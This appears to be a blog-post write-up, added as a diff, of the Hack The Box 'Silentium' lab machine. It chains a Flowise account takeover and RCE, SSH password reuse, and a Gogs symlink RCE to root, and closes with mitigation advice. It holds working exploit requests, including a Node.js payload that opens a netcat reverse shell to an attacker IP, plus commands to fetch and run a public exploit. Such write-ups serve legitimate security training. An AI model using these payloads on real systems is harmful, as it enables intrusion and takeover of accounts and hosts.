@@ -1,0 +1,343 @@
+export const frontmatter = {
+  title: "Hack The Box Silentium Machine Writeup",
+  slug: "hack-the-box-silentium-machine-writeup",
+  category: "HTB Machine",
+  tags: "Flowise, CVE-2025-58434, CVE-2025-59528, Gogs, CVE-2025-8110, RCE",
+  description:
+    "Complete walkthrough of the Hack The Box Silentium machine, covering Flowise virtual host enumeration, account takeover, authenticated remote code execution, credential discovery, SSH password reuse, Gogs exploitation, and root access.",
+  date: "2026-09-13",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Silentium Writeup | Flowise RCE, Gogs Exploitation & Privilege Escalation | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Silentium writeup demonstrating Flowise account takeover via CVE-2025-58434, authenticated RCE via CVE-2025-59528, credential discovery and SSH password reuse, followed by authenticated Gogs RCE via CVE-2025-8110 to obtain root access.",
+};
+
+## Introduction
+
+Silentium is a Linux machine that begins with discovering a hidden Flowise instance, where chaining an account takeover with an authenticated RCE grants initial access. From there, finding hardcoded credentials allows lateral movement via SSH password reuse, culminating in a root shell by exploiting an internally tunneled Gogs service.
+
+## Attack Chain
+- **Initial Access:** Virtual Host enumeration reveals a Flowise instance -> Exploitation of CVE-2025-58434 allows Account Takeover of an internal user -> Exploitation of CVE-2025-59528 (Authenticated RCE) grants a shell inside a container.
+- **Lateral Movement:** Enumeration of environment variables reveals hardcoded SMTP credentials -> Password reuse allows SSH access to the host machine as the user `ben`.
+- **Privilege Escalation:** Internal port scanning identifies a locally bound Gogs instance -> SSH local port forwarding exposes the service -> Exploitation of CVE-2025-8110 (Authenticated RCE via Symlink) yields a root shell.
+
+## Setup
+
+Download a VPN configuration file from the webpage and connect to it via `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use `ping <ip_addr>`.
+
+## Initial Access
+
+Perform an Nmap scan with version detection (`-sV`) with: `nmap <ip_addr>`:
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 01:01 IST
+Nmap scan report for silentium.htb (10.129.22.64)
+Host is up (0.45s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+Upon visiting the IP in the browser, it gives an error. To solve it, add:
+```
+<ip_addr> silentium.htb 
+```
+to `/etc/hosts`
+
+> **NOTE:** We need to add an entry to `/etc/hosts` because the domain `silentium.htb` is not publicly registered. When you visit the target IP in a browser using this domain, the system attempts to resolve it via public DNS servers. Since the domain does not exist publicly, DNS resolution fails. By adding the IP address and domain to `/etc/hosts`, you create a local mapping, allowing your system to resolve `silentium.htb` to the correct IP address without relying on external DNS servers.
+
+Now, perform a Gobuster scan to discover virtual hosts with `gobuster vhost -u http://silentium.htb --append-domain -w wordlist.txt`:
+```
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://silentium.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /home/vinod/Desktop/raft-large-directories.txt
+[+] User Agent:                gobuster/3.8
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+staging.silentium.htb Status: 200 [Size: 3142]
+Progress: 20000 / 20000 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+To access `staging.silentium.htb` it needs to be added to `/etc/hosts` as
+```
+<ip_addr> silentium.htb staging.silentium.htb
+```
+
+Visiting `staging.silentium.htb` reveals that it runs Flowise version 3.0.5, which can be verified with `curl http://staging.silentium.htb/api/v1/version`.
+
+A quick Google search shows that it's vulnerable to [CVE-2025-58434](https://github.com/advisories/GHSA-wgpv-6j63-x5ph).
+
+For the exploit to succeed, a valid email address is required. However, enumeration of the target website (`silentium.htb`) does not directly reveal any email addresses. To work around this, the first names listed under the *Institutional Leadership* section can be used as a basis for generating potential email combinations, which can then be brute-forced to identify any valid accounts.
+
+We can try a few combinations such as:
+```
+ben@silentium.htb
+elena@silentium.htb
+rossi@silentium.htb
+elena_rossi@silentium.htb
+rossi_elena@silentium.htb
+marcus@silentium.htb
+throne@silentium.htb
+marcus_throne@silentium.htb
+throne_marcus@silentium.htb
+```
+
+And we will try them one by one:
+```
+curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"user":{"email":"ben@silentium.htb"}}'
+```
+
+This returns:
+```
+{"user":{"id":"e2████████████████████████████████73","name":"admin","email":"ben@silentium.htb","credential":"$2████████████████████████████████████████████████████████hG","tempToken":"lz████████████████████████████████████████████████████████████Ku","tokenExpiry":"2026-04-19T20:22:22.261Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-19T20:07:22.000Z","createdBy":"e2████████████████████████████████73","updatedBy":"e2████████████████████████████████73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
+```
+
+Now, since we have obtained the token, it can be used to reset the password:
+```
+curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{
+        "user":{
+          "email":"ben@silentium.htb",
+          "tempToken":"lz████████████████████████████████████████████████████████████Ku",
+          "password":"admin"
+        }
+      }'
+```
+
+> **NOTE:** The vulnerability arises because the `/api/v1/account/forgot-password` endpoint accepts an email as input, but instead of only triggering a password reset email, it responds with sensitive user information. This includes the user ID, name, email, hashed credentials, account status, timestamps, and—most critically—a valid `temptoken` intended for password reset.
+
+Flowise v3.0.5 is also affected by [CVE-2025-59528](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p). This issue can be exploited to achieve remote code execution (RCE), making it a critical attack vector.
+
+Start a netcat listener on port `9002`
+
+Authorization Token can be obtained by logging into `staging.silentium.htb` then to [API Key](http://staging.silentium.htb/apikey) section
+
+To exploit the web app using **CVE-2025-59528** use:
+```
+curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer hW███████████████████████████████████████Jc" \
+  -d '{
+    "loadMethod": "listActions",
+    "inputs": {
+      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.39 9002 >/tmp/f\");return 1;})()})"
+    }
+  }'
+```
+
+> **NOTE:** The vulnerability arises because the `CustomMCP` node allows users to supply configuration settings for connecting to an external MCP. It parses the user-provided `mcpServerConfig` string to build the MCP server configuration; however, during this process, it executes JavaScript code without any security validation or sanitization.
+
+Upon successful exploitation, we will see:
+```
+listening on [any] 9002 ...
+connect to [10.10.14.39] from (UNKNOWN) [10.129.233.136] 36787
+sh: can't access tty; job control turned off
+/ #
+```
+
+## Lateral Movement
+
+With `env` it reveals enviroment variables:
+```
+FLOWISE_PASSWORD=F1███████3r                                                                                                                                
+ALLOW_UNAUTHORIZED_CERTS=true                                                                                                                               
+NODE_VERSION=20.19.4                                                                                                                                        
+HOSTNAME=c78c3cceb7ba                                                                                                                                       
+YARN_VERSION=1.22.22                                                                                                                                        
+SMTP_PORT=1025                                                                                                                                              
+SHLVL=3                                                                                                                                                     
+PORT=3000                                                                                                                                                   
+HOME=/root                                                                                                                                                  
+SENDER_EMAIL=ben@silentium.htb                                                                                                                              
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser                                                                                                         
+JWT_ISSUER=ISSUER                                                                                                                                           
+JWT_AUTH_TOKEN_SECRET=AA████████████████████████████████████DD                                                                                              
+LLM_PROVIDER=nvidia-nim
+SMTP_USERNAME=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+FLOWISE_USERNAME=ben
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/
+SMTP_PASSWORD=r0███████ge
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AA████████████████████████████████████DD
+SMTP_USER=test
+```
+
+We can try password reuse (`FLOWISE_PASSWORD` and `SMTP_PASSWORD`) for the user `ben` to try to connect to SSH:
+```
+The authenticity of host '10.129.233.136 (10.129.233.136)' can't be established.
+ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:45: [hashed name]
+    ~/.ssh/known_hosts:46: [hashed name]
+    ~/.ssh/known_hosts:47: [hashed name]
+    ~/.ssh/known_hosts:48: [hashed name]
+    ~/.ssh/known_hosts:49: [hashed name]
+    ~/.ssh/known_hosts:50: [hashed name]
+    ~/.ssh/known_hosts:51: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.233.136' (ED25519) to the list of known hosts.
+ben@10.129.233.136's password: r0███████ge
+```
+
+Enter the password, upon success it shows:
+```
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+
+...<SNIP>...
+
+Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
+ben@silentium:~$ 
+```
+
+Grab the user flag from `/home/ben` with `cat /home/ben/user.txt`, which returns:
+```
+9a████████████████████████████efS
+```
+
+## Privilege Escalation
+
+We can use `ss -tulnp` to list all listening TCP/UDP network sockets along with the processes (programs) that are using them:
+```
+Netid          State           Recv-Q          Send-Q                   Local Address:Port                      Peer Address:Port          Process          
+udp            UNCONN          0               0                           127.0.0.54:53                             0.0.0.0:*                              
+udp            UNCONN          0               0                        127.0.0.53%lo:53                             0.0.0.0:*                              
+udp            UNCONN          0               0                              0.0.0.0:68                             0.0.0.0:*                              
+tcp            LISTEN          0               511                            0.0.0.0:80                             0.0.0.0:*                              
+tcp            LISTEN          0               4096                           0.0.0.0:22                             0.0.0.0:*                              
+tcp            LISTEN          0               4096                         127.0.0.1:3001                           0.0.0.0:*                              
+tcp            LISTEN          0               4096                         127.0.0.1:3000                           0.0.0.0:*                              
+tcp            LISTEN          0               4096                         127.0.0.1:35547                          0.0.0.0:*                              
+tcp            LISTEN          0               4096                        127.0.0.54:53                             0.0.0.0:*                              
+tcp            LISTEN          0               4096                     127.0.0.53%lo:53                             0.0.0.0:*                              
+tcp            LISTEN          0               4096                         127.0.0.1:1025                           0.0.0.0:*                              
+tcp            LISTEN          0               4096                         127.0.0.1:8025                           0.0.0.0:*                              
+tcp            LISTEN          0               511                               [::]:80                                [::]:*                              
+tcp            LISTEN          0               4096                              [::]:22                                [::]:*               
+```
+
+Two non-standard application ports, 3000 and 3001, were identified as active on the target. Since these services are bound to localhost, they are not directly accessible externally; however, they can be accessed by establishing an SSH tunnel:
+```
+ssh -L 3001:127.0.0.1:3001 -L 3000:127.0.0.1:3000 ben@<ip_addr>
+```
+
+> **NOTE:** We used the `-L` parameter for local port forwarding.
+
+Upon visiting `127.0.0.1:3001` it reveals that it is running Gogs Git service
+
+With `ps aux | grep gogs` it shows that it's running from `/opt/gogs/gogs/gogs web` as `root`:
+```
+root        1530  0.0  1.8 1738472 72708 ?       Ssl  14:08   0:01 /opt/gogs/gogs/gogs web
+ben        26909  0.0  0.0   6544  2280 pts/0    S+   17:55   0:00 grep --color=auto gogs
+```
+
+To find its version using `/opt/gogs/gogs/gogs --version`:
+```
+Gogs version 0.13.3
+```
+
+This version is vulnerable to [CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110), which can be verified with `searchsploit gogs`:
+```
+-------------------------------------------------------------------------------
+ Exploit Title                                  Path
+-------------------------------------------------------------------------------
+Gogs - 'label' SQL Injection                  | multiple/webapps/35237.txt
+Gogs - 'users'/'repos' '?q' SQL Injection     | multiple/webapps/35238.txt
+gogs 0.13.0 - Remote Code Execution (RCE)     | multiple/remote/52348.py
+-------------------------------------------------------------------------------
+Shellcodes: No Results
+```
+
+Download publicly available exploit from [here](https://raw.githubusercontent.com/Ghxstsec/CVE-2025-8110/refs/heads/main/CVE-2025-8110-RCE.py) with `curl`:
+```
+loxcalhost@htb[/]$ curl https://raw.githubusercontent.com/Ghxstsec/CVE-2025-8110/refs/heads/main/CVE-2025-8110-RCE.py > exploit.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7183 100  7183   0     0 16066     0  --:--:-- --:--:-- --:--:-- 16141
+```
+
+Start a reverse shell listener with `nc -lvnp 4444`.
+
+Edit the `exploit.py` file by setting the `username` to the one used during account creation. Then, generate an access token by navigating to **Settings → Application** in the web interface, clicking **Generate New Token**, and providing a token name. Copy the generated token and include it in the script. Alternatively, you can access this page directly at: [Token Retrieval WebPage](http://localhost:3001/user/settings/applications)
+
+Run the exploit with `python exploit.py -u http://localhost:3001/ -lh 10.10.14.19 -lp 4444 -p user`:
+```
+
+   _____ _____   _____ 
+  / ____|  __ \ / ____|
+ | |  __| |__) | |  __ 
+ | | |_ |  _  /| | |_ |
+ | |__| | | \ \| |__| |
+  \_____|_|  \_\\_____|
+                       
+CVE-2025-8110 - Gogs Remote Code Execution
+Authenticated RCE via Symlink + sshCommand Injection
+
+
+Author : ghxtsec
+Based on: zAbuQasem original PoC
+------------------------------------------------
+
+[+] Login exitoso
+Repo creation status: 201
+[+] Repo creado: 4f1b769ca674
+Clonando con URL: http://new_user:user@localhost:3001/new_user/4f1b769ca674.git
+[master 277e158] Add malicious symlink
+ 1 file changed, 1 insertion(+)
+ create mode 120000 malicious_link
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 8 threads
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 299 bytes | 299.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To http://localhost:3001/new_user/4f1b769ca674.git
+   48b0fc3..277e158  master -> master
+[+] Symlink subido y pusheado correctamente
+[-] Error: HTTPConnectionPool(host='localhost', port=3001): Read timed out. (read timeout=10)
+```
+
+During exploitation, the `-lh` and `-lp` parameters are used to specify the listening host and listening port, respectively, while the `-p` parameter is used to provide the account password.
+
+Upon successful execution, we'll have a reverse shell as a root user.
+
+> **NOTE:** The vulnerability arises because Gogs allows symbolic links within Git repositories, and these links can reference files outside the repository. Additionally, the Gogs API permits file modifications outside the standard Git workflow. In earlier implementations, there were insufficient checks to prevent abuse of symbolic links, making it possible to access or modify unintended files beyond the repository scope.
+
+Grab the root flag with `cat /root/root.txt`:
+```
+0a████████████████████████████fc
+```
+
+## Mitigation and Remediation
+- **Patch Management (Flowise & Gogs):** The initial foothold and final privilege escalation both relied on exploiting known vulnerabilities in outdated software. Flowise must be updated to version 3.0.6 or higher to patch CVE-2025-58434 and CVE-2025-59528. Similarly, Gogs should be updated to the latest stable release to resolve the symlink vulnerability (CVE-2025-8110).
+- **Credential Management & Password Reuse:** Hardcoding plaintext credentials (such as `SMTP_PASSWORD` and `FLOWISE_PASSWORD`) in environment variables poses a significant security risk. Furthermore, the user `ben` reused these application credentials for his system SSH account. Organization-wide policies should enforce password complexity, prohibit password reuse, and mandate SSH key-pair authentication over password-based logins.
+- **Principle of Least Privilege:** The Gogs web service was found running directly as the `root` user. Web applications and internal services should always be executed under dedicated, low-privileged service accounts (e.g., a `git` or `gogs` user). If this practice had been followed, the Gogs RCE exploit would have only granted limited access rather than immediate total system compromise.
